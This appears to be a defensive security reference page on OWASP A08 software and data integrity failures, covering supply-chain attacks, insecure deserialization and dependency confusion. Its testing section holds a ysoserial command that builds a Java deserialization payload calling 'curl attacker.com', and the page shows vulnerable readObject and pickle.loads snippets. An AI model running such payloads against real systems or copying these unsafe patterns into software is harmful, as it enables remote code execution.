# A08 — Software and Data Integrity Failures

**CVSS Range:** Up to 9.8 (Critical)
**CWE References:** CWE-494, CWE-829, CWE-502

---

### What it is
A new category in 2021. This covers two related issues: (1) software updates and CI/CD pipelines that don't verify the integrity of what they deploy, and (2) insecure deserialization — where applications process serialised data from untrusted sources without validation.

### Why it happens
- CI/CD pipelines fetch packages from public registries without verifying checksums
- Auto-update mechanisms don't verify digital signatures
- Serialised objects are accepted from user input without validation
- Supply chain attacks are sophisticated and hard to detect

### Real-world examples

**Supply chain attack:**
```
SolarWinds (2020):
→ Attacker compromised SolarWinds' build system
→ Malicious code inserted into signed software updates
→ 18,000 organisations downloaded and installed the backdoored update
→ Including US government agencies and major corporations

npm package hijacking:
→ event-stream (2018): maintainer tricked into adding malicious co-maintainer
→ ua-parser-js (2021): malicious package pushed by credential-stealing malware
→ thousands of applications silently infected via package updates
```

**Insecure Deserialization:**
```java
// Java deserialization vulnerability
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // If data is attacker-controlled → RCE

// PHP unserialize() attack
// Crafted serialized object triggers magic methods (__destruct, __wakeup)
// leading to arbitrary file write or code execution

// Python pickle deserialization
import pickle
data = pickle.loads(user_input)  // Never unpickle untrusted data
```

**Dependency confusion attack:**
```
# Attacker registers a public npm package with the same name as
# a company's private internal package, but with a higher version number
# npm fetches the public malicious one instead of the private one
# All developers who npm install now run the attacker's code
```

### How to test for it

```bash
# Check if application accepts serialized objects
# Look for:
# - Java: rO0AB (base64 prefix of Java serialized objects)
# - PHP: O:4:"User":1:{...}
# - Python: \x80\x04 (pickle magic bytes)

# Test with ysoserial (Java deserialization)
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com" | base64

# Check CI/CD pipeline configuration
# Does it verify package checksums?
# Does it pin dependency versions?
# Does it use private package mirrors?

# Check for Subresource Integrity on CDN scripts
# <script src="https://cdn.example.com/lib.js"> → MISSING integrity attribute
# <script src="..." integrity="sha384-..."> → CORRECT
```

### Tools

| Tool | How to use it |
|---|---|
| `ysoserial` | Generate Java deserialization payloads |
| `PHPGGC` | PHP deserialization gadget chain generator |
| `Burp Suite` | Identify and modify serialized data in requests |
| `truffleHog` | Find secrets in Git history / CI pipeline configs |
| `Retire.js` | Detect CDN-loaded libraries without SRI |
| `Syft / Grype` | Generate SBOM and scan for vulnerabilities |

### How to fix it

- Verify digital signatures on all software updates before applying
- Pin dependency versions and verify checksums in lock files (`package-lock.json`, `Pipfile.lock`)
- Use private package registries and proxy public ones through them
- Never deserialise data from untrusted sources — use safer formats (JSON with schema validation)
- Implement Subresource Integrity (SRI) on all CDN-loaded scripts
- Use an allowlist for the classes/types that can be deserialized

---
